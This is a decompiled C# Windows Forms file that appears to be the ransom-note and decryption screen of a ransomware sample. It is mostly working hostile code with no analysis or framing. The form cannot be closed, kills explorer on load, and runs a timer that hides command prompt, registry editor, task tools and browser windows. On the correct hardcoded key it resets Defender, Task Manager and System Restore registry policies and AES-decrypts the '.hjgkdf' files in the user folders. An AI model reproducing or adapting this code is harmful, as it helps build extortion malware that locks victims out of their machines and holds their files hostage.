using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace hjgkdf;

public class Form2 : Form
{
	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private const bool DELETE_ENCRYPTED_FILE = true;

	private const bool DECRYPT_DESKTOP = true;

	private const bool DECRYPT_DOCUMENTS = true;

	private const bool DECRYPT_PICTURES = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".hjgkdf";

	private const string ENCRYPT_PASSWORD = "45878575346885467854879865976947896578678897896787954765489789768768905768907809678609476809768097689076878609768";

	private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static string DECRYPTION_LOG = "";

	private static int decryptedFileCount = 0;

	private IContainer components = null;

	private Label label1;

	private Label label2;

	private TextBox textBox1;

	private Button button1;

	private Timer tmr_kill;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	public Form2()
	{
		InitializeComponent();
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f9: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "45878575346885467854879865976947896578678897896787954765489789768768905768907809678609476809768097689076878609768")
		{
			MessageBox.Show("the key is correct", "CORRECT KEY", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey2.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
			RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey3.SetValue("hjgkdf", 0, RegistryValueKind.String);
			RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
			registryKey4.SetValue("DisableAntiSpyware", 0, RegistryValueKind.DWord);
			RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
			registryKey5.SetValue("DisableRoutinelyTakingAction", 0, RegistryValueKind.DWord);
			RegistryKey registryKey6 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey6.SetValue("WindowsDefenderMAJ", 0, RegistryValueKind.DWord);
			RegistryKey registryKey7 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey7.SetValue("WindowsDefenderMAJ", 0, RegistryValueKind.DWord);
			RegistryKey registryKey8 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
			registryKey8.SetValue("Enabled", 0, RegistryValueKind.DWord);
			RegistryKey registryKey9 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
			registryKey9.SetValue("Enabled", 0, RegistryValueKind.DWord);
			RegistryKey registryKey10 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
			registryKey10.SetValue("DisableSR", 0, RegistryValueKind.DWord);
			RegistryKey registryKey11 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
			registryKey11.SetValue("DisableSR", 0, RegistryValueKind.DWord);
			RegistryKey registryKey12 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
			registryKey12.SetValue("DisableConfig", 0, RegistryValueKind.DWord);
			RegistryKey registryKey13 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
			registryKey13.SetValue("DisableConfig", 0, RegistryValueKind.DWord);
			RegistryKey registryKey14 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
			registryKey14.SetValue("USBTOR", 0, RegistryValueKind.DWord);
			RegistryKey registryKey15 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
			registryKey15.SetValue("USBTOR", 0, RegistryValueKind.DWord);
			RegistryKey registryKey16 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows");
			registryKey16.SetValue("DisableCMD", 0, RegistryValueKind.DWord);
			RegistryKey registryKey17 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
			registryKey17.SetValue("Restrict_Run", 0, RegistryValueKind.DWord);
			RegistryKey registryKey18 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
			registryKey18.SetValue("Restrict_Run", 0, RegistryValueKind.DWord);
			RegistryKey registryKey19 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
			registryKey19.SetValue("DisableRealtimeMonitoring", 0, RegistryValueKind.DWord);
			RegistryKey registryKey20 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
			registryKey20.SetValue("DisableRealtimeMonitoring", 0, RegistryValueKind.DWord);
			RegistryKey registryKey21 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
			registryKey21.SetValue("SecurityHealthService", 0, RegistryValueKind.DWord);
			RegistryKey registryKey22 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey22.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
			RegistryKey registryKey23 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
			registryKey23.SetValue("NoControlPanel", 0, RegistryValueKind.DWord);
			RegistryKey registryKey24 = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
			registryKey24.SetValue("MinimalX", 0, RegistryValueKind.DWord);
			RegistryKey registryKey25 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey25.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
			decryptFolderContents(DESKTOP_FOLDER);
			decryptFolderContents(PICTURES_FOLDER);
			decryptFolderContents(DOCUMENTS_FOLDER);
			if (decryptedFileCount > 0)
			{
				dropDecryptionLog();
			}
			else
			{
				Console.Out.WriteLine("No files to encrypt.");
			}
		}
		else
		{
			MessageBox.Show("incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private static void dropDecryptionLog()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\___DECRYPTION_LOG.txt");
		streamWriter.WriteLine(decryptedFileCount + " files have been decrypted.\n----------------------------------------\n" + DECRYPTION_LOG);
		streamWriter.Close();
	}

	private static bool fileIsEncrypted(string inputFile)
	{
		if (inputFile.Contains(".hjgkdf") && inputFile.Substring(inputFile.Length - ".hjgkdf".Length, ".hjgkdf".Length) == ".hjgkdf")
		{
			return true;
		}
		return false;
	}

	private static void decryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (fileIsEncrypted(text))
				{
					FileDecrypt(text, text.Substring(0, text.Length - ".hjgkdf".Length), "45878575346885467854879865976947896578678897896787954765489789768768905768907809678609476809768097689076878609768");
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				decryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
			File.Delete(inputFile);
			DECRYPTION_LOG = DECRYPTION_LOG + inputFile + "\n";
			decryptedFileCount++;
		}
	}

	private void tmr_kill_Tick(object sender, EventArgs e)
	{
		tmr_kill.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "msconfig")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Attrib")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "notepad")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "google chrome")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Opera")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Firefox")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Control Panel")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Internet Explorer")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Microsoft Edge")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
		}
		tmr_kill.Start();
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		tmr_kill.Start();
		Process[] array = null;
		array = Process.GetProcessesByName("explorer.exe");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Expected O, but got Unknown
		//IL_01e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ed: Expected O, but got Unknown
		//IL_0343: Unknown result type (might be due to invalid IL or missing references)
		//IL_034d: Expected O, but got Unknown
		components = new Container();
		label1 = new Label();
		label2 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		tmr_kill = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(283, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(519, 33));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Oops.. Your files have been encrypted!");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 26.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(299, 185));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(503, 78));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Your files have been encrypted.\r\nWrite key for decrypt");
		((Control)textBox1).set_Location(new Point(421, 356));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(228, 20));
		((Control)textBox1).set_TabIndex(2);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)button1).set_Location(new Point(421, 383));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(228, 73));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("decrypt");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		tmr_kill.set_Enabled(true);
		tmr_kill.add_Tick((EventHandler)tmr_kill_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(1118, 562));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form2");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
